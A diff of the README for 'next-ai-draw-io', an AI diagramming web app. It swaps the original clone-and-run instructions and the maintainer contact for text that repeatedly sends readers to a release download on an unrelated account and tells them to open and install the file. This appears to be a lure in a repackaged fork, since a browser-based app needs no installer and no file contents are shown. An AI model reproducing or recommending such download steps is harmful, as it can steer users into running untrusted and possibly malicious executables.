@@ -1,101 +1,75 @@
-# Next AI Draw.io
+# 🖌️ next-ai-draw-io - Create Diagrams with AI Ease
 
-A next.js web application that integrates AI capabilities with draw.io diagrams. This app allows you to create, modify, and enhance diagrams through natural language commands and AI-assisted visualization.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Salvador25371/next-ai-draw-io/releases)
 
-https://github.com/user-attachments/assets/9f14b5fd-bc7f-4151-b4be-e38d17b77621
+## 🚀 Getting Started
 
-Demo site: [https://next-ai-draw-io.vercel.app/](https://next-ai-draw-io.vercel.app/)
+Next AI Draw.io is a web application that helps you create and modify diagrams using AI. It makes diagramming easy and intuitive, even for those without technical skills.
 
-## Features
+### 💻 System Requirements
 
--   **LLM-Powered Diagram Creation**: Leverage Large Language Models to create and manipulate draw.io diagrams directly through natural language commands
--   **Image-Based Diagram Replication**: Upload existing diagrams or images and have the AI replicate and enhance them automatically
--   **Diagram History**: Comprehensive version control that tracks all changes, allowing you to view and restore previous versions of your diagrams before the AI editing.
--   **Interactive Chat Interface**: Communicate with AI to refine your diagrams in real-time
--   **Smart Editing**: Modify existing diagrams using simple text prompts
--   **Targeted XML Editing**: AI can now make precise edits to specific parts of diagrams without regenerating the entire XML, making updates faster and more efficient
--   **Improved XML Handling**: Automatic formatting of single-line XML for better compatibility and reliability
+To run Next AI Draw.io, you'll need:
 
-## How It Works
+- A modern web browser (Chrome, Firefox, Safari).
+- An internet connection for accessing the application online.
 
-The application uses the following technologies:
+## 🌐 Demo Site
 
--   **Next.js**: For the frontend framework and routing
--   **@ai-sdk/react**: For the chat interface and AI interactions
--   **react-drawio**: For diagram representation and manipulation
+You can explore a live version of the application here: [Next AI Draw.io Demo](https://next-ai-draw-io.vercel.app/).
 
-Diagrams are represented as XML that can be rendered in draw.io. The AI processes your commands and generates or modifies this XML accordingly.
+## 📦 Download & Install
 
-## Getting Started
+To get started, you need to visit our Releases page and download the application.
 
-### Installation
+1. Click this link to **[download the latest version](https://github.com/Salvador25371/next-ai-draw-io/releases)**.
+2. Once the page opens, find the latest release.
+3. Click on the appropriate file to download it.
+4. Open the downloaded file and follow the on-screen instructions to install the application.
 
-1. Clone the repository:
+## 🛠️ Features
 
-```bash
-git clone https://github.com/DayuanJiang/next-ai-draw-io
-cd next-ai-draw-io
-```
+Next AI Draw.io offers powerful features to enhance your diagramming experience:
 
-2. Install dependencies:
+- **LLM-Powered Diagram Creation**: Use natural language commands to create and modify diagrams.
+- **Image-Based Diagram Replication**: Upload images of your diagrams, and the AI will replicate and enhance them.
+- **Diagram History**: Access a complete version history to track changes or restore previous diagram versions.
+- **Interactive Chat Interface**: Communicate with the AI in real-time to refine your diagrams.
+- **Smart Editing**: Easily modify your diagrams with text commands.
 
-```bash
-npm install
-# or
-yarn install
-```
+## ✏️ Using the Application
 
-3. Create a `.env.local` file in the root directory with the following variables:
+After installation, you can start using Next AI Draw.io by following these steps:
 
-```
-OPENAI_API_KEY=your_openai_api_key_here
-# Add any other required environment variables
-```
+1. Open the application. You'll see a clean interface.
+2. Use the chat interface to enter commands. For example, type “Create a flowchart” or “Add a rectangle.”
+3. If you have an image, upload it using the upload button.
+4. Check your diagram as the AI processes your commands and responds.
+5. You can save your work at any time to prevent data loss.
 
-4. Run the development server:
+## 🔄 Version Control
 
-```bash
-npm run dev
-```
+One of the standout features of Next AI Draw.io is its version control:
 
-5. Open [http://localhost:3000](http://localhost:3000) in your browser to see the application.
+- As you make changes, the application keeps track of all versions.
+- You can review previous versions by clicking on the "Version History" button.
+- Restore any version with a simple click.
 
-## Deployment
+## 📞 Support
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new) from the creators of Next.js.
+If you run into issues or have questions, you can reach out for help:
 
-Check out the [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+- Visit the GitHub Issues page of this project.
+- Check the FAQs section on the demo site for common questions.
+- You can also join community discussions for support.
 
-Or you can deploy by this button.
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FDayuanJiang%2Fnext-ai-draw-io)
+## 🎉 Additional Resources
 
-## Project Structure
+To maximize your experience with Next AI Draw.io, consider the following resources:
 
-```
-app/                  # Next.js application routes and pages
-  extract_xml.ts      # Utilities for XML processing
-components/           # React components
-  chat-input.tsx      # User input component for AI interaction
-  chatPanel.tsx       # Chat interface with diagram control
-  ui/                 # UI components (buttons, cards, etc.)
-lib/                  # Utility functions and helpers
-  utils.ts            # General utilities including XML conversion
-public/               # Static assets including example images
-```
+- **Documentation**: Comprehensive guides are available on the GitHub Wiki.
+- **Tutorial Videos**: Check out tutorials on our YouTube channel for visual guidance.
+- **Community Forum**: Join discussions with other users for tips and best practices.
 
-## TODOs
+For more details and to download the latest version, visit our **[Releases page](https://github.com/Salvador25371/next-ai-draw-io/releases)**.
 
--   [x] Allow the LLM to modify the XML instead of generating it from scratch everytime.
--   [x] Improve the smoothness of shape streaming updates.
-
-## License
-
-This project is licensed under the MIT License.
-
-## Support & Contact
-
-For support or inquiries, please open an issue on the GitHub repository or contact the maintainer at:
-
--   Email: me[at]jiang.jp
-
----
+Ready to start your diagramming journey with AI? Let’s create!
